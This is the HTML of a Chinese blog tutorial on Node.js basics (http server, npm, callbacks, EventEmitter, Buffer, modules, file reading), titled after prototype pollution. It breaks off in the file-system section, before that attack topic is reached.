

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="https://raw.githubusercontent.com/wo02ie/photo/main/icon.jpg">
  <link rel="icon" href="https://raw.githubusercontent.com/wo02ie/photo/main/icon.jpg">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  <meta name="description" content="nodejsJavaScript：  ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象) DOM（一些操作页面元素的方法） BOM（一些操作浏览器的方法）  上面是JavaScript的组成部分，那么Nodejs呢？ Nodejs：  ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象) os(操作系统) file(文件系统) net(网络系统) data">
<meta property="og:type" content="article">
<meta property="og:title" content="nodejs&amp;原型链污染">
<meta property="og:url" content="http://example.com/2021/04/27/nodejs&Prototype-Pollution-Attack/index.html">
<meta property="og:site_name" content="wo02ie">
<meta property="og:description" content="nodejsJavaScript：  ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象) DOM（一些操作页面元素的方法） BOM（一些操作浏览器的方法）  上面是JavaScript的组成部分，那么Nodejs呢？ Nodejs：  ECMAScript(语言基础，如：语法、数据类型结构以及一些内置对象) os(操作系统) file(文件系统) net(网络系统) data">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/npminit.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/PERl.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/event_loop.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/EventEmitter.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/require.jpg">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/n.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE2.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE3.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211119005530731.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/%E6%B1%A1%E6%9F%93.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211121223733792.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211122000430212.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211122183340194.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172124317.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172422442.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172602483.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124172725768.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124173907879.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124174739562.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211124174952093.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125001447005.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125001503138.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125003052754.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125003818514.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125082102153.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125082655288.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125084259360.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125084511998.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126173326438.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126173359572.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125170700643.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173138254.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173338485.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211125173430135.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126174150498.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126174434191.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126183747677.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126184235129.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126212401866.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126231450129.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126231900595.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211126232004589.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/image-20211127000013927.png">
<meta property="og:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/%E8%AE%BF%E9%97%AE%E5%90%8E%E7%AB%AFjs%E6%96%87%E4%BB%B6.png">
<meta property="article:published_time" content="2021-04-27T14:29:42.519Z">
<meta property="article:modified_time" content="2021-11-27T15:25:50.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="knowledge">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/wo02ie/photo/main/npminit.png">
  
  <title>nodejs&amp;原型链污染 - wo02ie</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  


<!-- 主题依赖的图标库，不要自行修改 -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- 自定义样式保持在最底部 -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.12","typing":{"enable":true,"typeSpeed":90,"cursorChar":"_","loop":true},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":"G-SL9T1KRBQY","gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 6.0.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>wo02ie</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/links/">
                <i class="iconfont icon-link-fill"></i>
                Links
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
            </a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('https://raw.githubusercontent.com/wo02ie/photo/main/post.jpg') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="nodejs&amp;原型链污染">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-04-27 22:29" pubdate>
        April 27, 2021 pm
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      34k 字
    </span>
  

  
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      NaN 分钟
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">nodejs&amp;原型链污染</h1>
            
            <div class="markdown-body">
              <h1 id="nodejs"><a href="#nodejs" class="headerlink" title="nodejs"></a>nodejs</h1><p><strong>JavaScript</strong>：</p>
<ul>
<li><code>ECMAScript</code>(语言基础，如：语法、数据类型结构以及一些内置对象)</li>
<li><code>DOM</code>（一些操作页面元素的方法）</li>
<li><code>BOM</code>（一些操作浏览器的方法）</li>
</ul>
<p>上面是<code>JavaScript</code>的组成部分，那么<code>Nodejs</code>呢？</p>
<p><strong>Nodejs</strong>：</p>
<ul>
<li><code>ECMAScript</code>(语言基础，如：语法、数据类型结构以及一些内置对象)</li>
<li><code>os</code>(操作系统)</li>
<li><code>file</code>(文件系统)</li>
<li><code>net</code>(网络系统)</li>
<li><code>database</code>(数据库)</li>
</ul>
<p>简单的说 Node.js 就是运行在服务端的 JavaScript。</p>
<p>Node.js 是一个基于Chrome JavaScript 运行时建立的一个平台。</p>
<p>Node.js是一个事件驱动I/O服务端JavaScript环境，基于Google的V8引擎，V8引擎执行Javascript的速度非常快，性能非常好。</p>
<p>安装、环境配置略</p>
<h2 id="一、运行脚本"><a href="#一、运行脚本" class="headerlink" title="一、运行脚本"></a>一、运行脚本</h2><p>（ 略）<br>目的：编写简单的一个脚本并运行 了解nodejs</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;hello world!&quot;</span>) <span class="hljs-meta">#保存为helloworld.js文件</span><br></code></pre></td></tr></table></figure>
<p>终端到此目录，<code>node helloworld.js</code></p>
<p>查找命令node -h</p>
<h2 id="二、web服务器"><a href="#二、web服务器" class="headerlink" title="二、web服务器"></a>二、web服务器</h2><p>使用php编写后端代码后 部署需要Apache或Nginx 并且要有mod_php和php_cgi才能成功解析php</p>
<p>nodejs不仅能充当上述服务器的作用 还能实现一个应用</p>
<p>就上例而言 nodejs的应用由http模块、服务器、处理请求和发送响应</p>
<h3 id="①引入模块"><a href="#①引入模块" class="headerlink" title="①引入模块"></a>①引入模块</h3><p>使用require载入http模块 把实例化的HTTP服务赋值给变量http 其中require是nodejs自带的http模块<br><code>var http = require(&quot;http&quot;);</code></p>
<h3 id="②创建服务器"><a href="#②创建服务器" class="headerlink" title="②创建服务器"></a>②创建服务器</h3><p>在http模块中提供一函数creatServer，函数会返回一个对象 可以通过listen的方法截获</p>
<p>http.creatServe()方法创建服务器 listen 8080<br>在里面使用request和response来接收和响应</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//httpserver.js</span><br><span class="hljs-keyword">var</span> http = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;http&#x27;</span>);<br><br>http.createServer(<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">request,response</span>)</span>&#123;<br>    response.writeHead(<span class="hljs-number">200</span>,&#123;<span class="hljs-string">&#x27;Content-Type&#x27;</span>:<span class="hljs-string">&#x27;text/plain&#x27;</span>&#125;);<span class="hljs-comment">//http头 状态码 内容类型</span><br>    response.end(<span class="hljs-string">&quot;The js had been called!\n&quot;</span>)<br>&#125;).listen(<span class="hljs-number">8080</span>)<span class="hljs-comment">//监听8080端口</span><br><br><span class="hljs-built_in">console</span>.log(<span class="hljs-string">&#x27;Server running at http://127.0.0.1:8080&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>配合index.html</p>
<h2 id="三、npm"><a href="#三、npm" class="headerlink" title="三、npm"></a>三、npm</h2><p>npm是nodejs的包管理工具 新版的nodejs已经带有npm<br>但通常要升级<code>npm install npm -g(全局安装)</code><br>也需要配置镜像<code>npm install -g cnpm --registry=https://registry.npm.taobao.org</code><br>安装模块分为本地安装和全局安装</p>
<ul>
<li><p>本地安装</p>
<ol>
<li>将安装包放在 ./node_modules 下（运行 npm 命令时所在的目录），如果没有 node_modules 目录，会在当前执行 npm 命令的目录下生成 node_modules 目录。</li>
<li>可以通过 require() 来引入本地安装的包。 </li>
</ol>
</li>
<li><p>全局安装</p>
<ol>
<li>将安装包放在 /usr/local 下或者你 node 的安装目录。</li>
<li>可以直接在命令行里使用。</li>
</ol>
</li>
</ul>
<p>卸载<code>npm uninstall npm</code><br>升级<code>npm update npm</code><br>查看安装信息<code>npm list -g</code><br>搜索模块<code>npm search npm</code></p>
<h3 id="创建模块"><a href="#创建模块" class="headerlink" title="创建模块"></a>创建模块</h3><p>首先来看一个包的json 位于node_modules/npm的package.json<br>可以看到有</p>
<pre><code>name - 包名。

version - 包的版本号。

description - 包的描述。

homepage - 包的官网 url 。

author - 包的作者姓名。

contributors - 包的其他贡献者姓名。

dependencies - 依赖包列表。如果依赖包没有安装，npm 会自动将依赖包安装在 node_module 目录下。

repository - 包代码存放的地方的类型，可以是 git 或 svn，git 可在 Github 上。

main - main 字段指定了程序的主入口文件，require(&#39;moduleName&#39;) 就会加载这个文件。这个字段的默认值是模块根目录下面的 index.js。

keywords - 关键字
</code></pre>
<p>npm init(目录下无package.json 否则会修改当前的package.json文件)<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/npminit.png" srcset="/img/loading.gif" lazyload></p>
<p>接着使用npm来发布模块(不演示)</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 首先在npm资源库注册用户<code>npm adduser</code></li>
<li><input checked="" disabled="" type="checkbox"> 发布<code>npm publish</code></li>
</ul>
<h2 id="四、REPL-nodejs解释器"><a href="#四、REPL-nodejs解释器" class="headerlink" title="四、REPL nodejs解释器"></a>四、REPL nodejs解释器</h2><p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/PERl.png" srcset="/img/loading.gif" lazyload><br>查看REPL命令 <code>.help</code></p>
<p>可以不声明变量 但会直接输出<br>_下划线可以截取上一表达式的运算结果<br>可以键入变量名输出值 也能使用console.log函数<br>node中ctrl+c一次退出当前 两次退出解释器 ctrl+d直接退出解释器</p>
<h2 id="五、回调函数与事件循环"><a href="#五、回调函数与事件循环" class="headerlink" title="五、回调函数与事件循环"></a>五、回调函数与事件循环</h2><h3 id="回调"><a href="#回调" class="headerlink" title="回调"></a>回调</h3><p>先来看两个例子</p>
<ul>
<li>阻塞 1.js</li>
</ul>
<p> <code>var data = fs.readFileSync(&#39;input.txt&#39;);</code></p>
<p>读取完文件 执行程序</p>
<ul>
<li>非阻塞 2.js</li>
</ul>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>    <span class="hljs-keyword">if</span> (err) return console.error(err);<br>    console.log(data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure>



<p>读取文件的同时执行后面的代码 因此提高了程序的性能 从而我们可以把需要处理回调函数的参数写在回调函数内</p>
<p>即 <strong>阻塞是按顺序执行代码的 非阻塞可以不按照顺序执行</strong></p>
<h3 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h3><p>Node.js 异步编程的直接体现就是回调。</p>
<p>异步编程依托于回调来实现 但不能说使用了回调后程序就异步化了 </p>
<p>nodejs是单线程应用程序 而V8引擎提供的异步执行回调接口就可以处理大量的并发 从而极大的提升了性能</p>
<p>nodejs的几乎每个API接口都支持回调函数 所有事件均是上帝视角 当事件被检测到就会触发回调函数<br>Node.js 使用事件驱动模型，webserver一直接收请求而不等待读写操作（非阻塞式IO或事件驱动IO） 然后去服务下一个web请求 当这个请求完成 它被放回处理队列 当到达队列开头 这个结果被返回给用户 这种模型非常高效可扩展性也非常强<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/event_loop.jpg" srcset="/img/loading.gif" lazyload></p>
<p>回到开头的引言 我们了解了回调函数以及事件循环 就能执行异步操作了<br>下面是 将执行异步操作的函数写在回调函数的最后一个参数中 回调函数接收错误对象则作为第一个参数</p>
<p>执行3.js-&gt;删除input.txt-&gt;执行3.js</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> fs = require(<span class="hljs-string">&quot;fs&quot;</span>);<br><br>fs.readFile(&#x27;<span class="hljs-keyword">input</span>.txt&#x27;, function (<span class="hljs-keyword">err</span>, data) &#123;<br>   <span class="hljs-keyword">if</span> (<span class="hljs-keyword">err</span>)&#123;<br>      console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">err</span>.<span class="hljs-keyword">stack</span>);<br>      <span class="hljs-keyword">return</span>;<br>   &#125;<br>   console.<span class="hljs-built_in">log</span>(data.<span class="hljs-keyword">toString</span>());<br>&#125;);<br>console.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;程序执行完毕&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>readFile函数读取文件，如果在读取文件过程中发生错误，错误 err 对象就会输出错误信息。<br>如果没发生错误，readFile 跳过 err 对象的输出，文件内容就通过回调函数输出，此时就是一次异步操作。</p>
<h2 id="六、EventEmitter"><a href="#六、EventEmitter" class="headerlink" title="六、EventEmitter"></a>六、EventEmitter</h2><p>events模块只提供events.EventEmitter,它是事件触发和事件监听的封装 EventEmitter对象中有多个属性on绑定事件函数 emit属性触发事件</p>
<p>event.js EventEmitter用法</p>
<p>event1.js体现如下</p>
<p> EventEmitter 的每个事件由一个事件名和若干个参数组成，事件名是一个字符串，通常表达一定的语义。对于每个事件，EventEmitter 支持 若干个事件监听器。</p>
<p>当事件触发时，注册到这个事件的事件监听器被依次调用，事件参数作为回调函数参数传递。</p>
<p><img src="https://raw.githubusercontent.com/wo02ie/photo/main/EventEmitter.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>event实例.js 了解其他属性方法…</p>
<h3 id="error"><a href="#error" class="headerlink" title="error"></a>error</h3><p>一个事件发生错误时没有监听器时会报错 一般要对其设置error事件的监听器</p>
<h2 id="七、Buffer"><a href="#七、Buffer" class="headerlink" title="七、Buffer"></a>七、Buffer</h2><p>JavaScript 语言自身只有字符串数据类型，没有二进制数据类型。</p>
<p>但在处理像TCP流或文件流时，必须使用到二进制数据。因此在 Node.js中，定义了一个 Buffer 类，该类用来创建一个专门存放二进制数据的缓存区。</p>
<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sqf">const buf = Buffer.<span class="hljs-keyword">from</span>(<span class="hljs-string">&#x27;runoob&#x27;</span>, <span class="hljs-string">&#x27;ascii&#x27;</span>);<br><br><span class="hljs-comment">// 输出 72756e6f6f62</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;hex&#x27;</span>));<br><br><span class="hljs-comment">// 输出 cnVub29i</span><br>console.<span class="hljs-built_in">log</span>(buf.<span class="hljs-built_in">toString</span>(<span class="hljs-string">&#x27;base64&#x27;</span>))<br></code></pre></td></tr></table></figure>
<p>目前支持的字符编码ascii、utf8、utf16le、ucs2 - utf16le、base64、latin1、binary - latin1、hex</p>
<p>写入缓冲区</p>
<blockquote>
<p>buf.write(string[, offset[, length]][, encoding])</p>
</blockquote>
<p>从缓冲区读取</p>
<blockquote>
<p>buf.toString([encoding[, start[, end]]])</p>
</blockquote>
<p>将buffer转换为json对象</p>
<blockquote>
<p>buf.toJSON()</p>
</blockquote>
<p>合并缓冲区</p>
<blockquote>
<p>Buffer.concat(list[, totalLength])</p>
</blockquote>
<p>比较缓冲区</p>
<blockquote>
<p>buf.compare(otherBuffer);</p>
</blockquote>
<p>拷贝缓冲区</p>
<blockquote>
<p>buf.copy(targetBuffer[, targetStart[, sourceStart[, sourceEnd]]])</p>
</blockquote>
<p>裁剪缓冲区</p>
<blockquote>
<p>buf.slice([start[, end]])</p>
</blockquote>
<p>计算缓冲区长度</p>
<blockquote>
<p>buf.length;</p>
</blockquote>
<h2 id="八、模块系统"><a href="#八、模块系统" class="headerlink" title="八、模块系统"></a>八、模块系统</h2><p>前面介绍过了 引入模块使用require+模块文件<br><img src="https://raw.githubusercontent.com/wo02ie/photo/main/require.jpg" srcset="/img/loading.gif" lazyload><br>require接收http、fs等原生模块以及某路径下的文件模块，还有mod非原生模块</p>
<p>注意：require()不是全局的！</p>
<h2 id="九、函数"><a href="#九、函数" class="headerlink" title="九、函数"></a>九、函数</h2><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">function</span> <span class="hljs-title">say</span>(word) &#123;<br>  console.log(word);<br>&#125;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(someFunction, value) &#123;<br>  someFunction(value);<br>&#125;<br><br>execute(say, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure>
<p>say是一个函数 execute函数的第一个参数就是say本身(不是它的返回值) 而say中有一个参数 所以用本地变量someFunction来传递变量</p>
<ul>
<li>匿名函数<br>  一般我们函数使用是先声明后定义使用<br>  即使我们不急着定义函数体 但在对应域前必须声明了 我们才能调用 而这我们可在函数体内——在参数表中使用本地变量someFunction 在函数体内直接使用 甚至都不用给函数名字 <figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span><span class="hljs-params">(someFunction, value)</span></span> &#123;<br>  someFunction(value);<br>&#125;<br><br><span class="hljs-built_in">execute</span>(<span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">(word)</span></span>&#123; console.<span class="hljs-built_in">log</span>(word) &#125;, <span class="hljs-string">&quot;Hello&quot;</span>);<br></code></pre></td></tr></table></figure>
<h2 id="十、路由"><a href="#十、路由" class="headerlink" title="十、路由"></a>十、路由</h2>url请求 GET POST参数在前面搭建简单应用时没有提及 作为后端处理这些请求就要有相应的服务器的功能<br>router下有个index.js文件 里面可以设置数据库 引入其他模块 同样可以写一个服务的serve.js 引入http url等模块 启动后充当服务器<br>然后用到一个router.js的文件 写一个路由函数作为参数传给server.js<br>至此可以访问url </li>
</ul>
<h2 id="十一、全局变量"><a href="#十一、全局变量" class="headerlink" title="十一、全局变量"></a>十一、全局变量</h2><p>列出一丢丢：</p>
<p>_filename 当前脚本文件名 输出其绝对路径</p>
<p>_dirname 当前脚本所在路径</p>
<p>setTimeout(function(),ms) 全局函数 在指定毫秒后执行一次函数</p>
<p>clearTimeout(t) 清除setTimeout()</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">printHello</span>(<span class="hljs-params"></span>)</span>&#123;<br>   <span class="hljs-built_in">console</span>.log( <span class="hljs-string">&quot;Hello, World!&quot;</span>);<br>&#125;<br><span class="hljs-comment">// 两秒后执行以上函数</span><br><span class="hljs-keyword">var</span> t = <span class="hljs-built_in">setTimeout</span>(printHello, <span class="hljs-number">2000</span>);<br><br><span class="hljs-comment">// 清除定时器</span><br><span class="hljs-built_in">clearTimeout</span>(t);<br></code></pre></td></tr></table></figure>

<p>setlnterval(function(),ms)<br>clearlnterval(t)<br>和上面的两个一样 不同的是 setlntercal会一直调用函数 直至clearlnterval调用或窗口关闭</p>
<p>process是global的属性 也是全局变量有四个事件<br>exit before uncaughException Signal</p>
<h2 id="十二、文件-异步"><a href="#十二、文件-异步" class="headerlink" title="十二、文件-异步"></a>十二、文件-异步</h2><p>导入文件系统模块<br><code>var fs = require(&quot;fs&quot;)</code></p>
<ul>
<li>读取input.txt<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">fs.read<span class="hljs-constructor">File(&#x27;<span class="hljs-params">input</span>.<span class="hljs-params">txt</span>&#x27;, <span class="hljs-params">function</span> (<span class="hljs-params">err</span>, <span class="hljs-params">data</span>)</span> &#123;<br>   <span class="hljs-keyword">if</span> (err) &#123;<br>       return console.error(err);<br>   &#125;<br>   console.log(<span class="hljs-string">&quot;异步读取: &quot;</span> + data.<span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span>);<br>&#125;);<br></code></pre></td></tr></table></figure></li>
</ul>
<p>类似地有函数：</p>
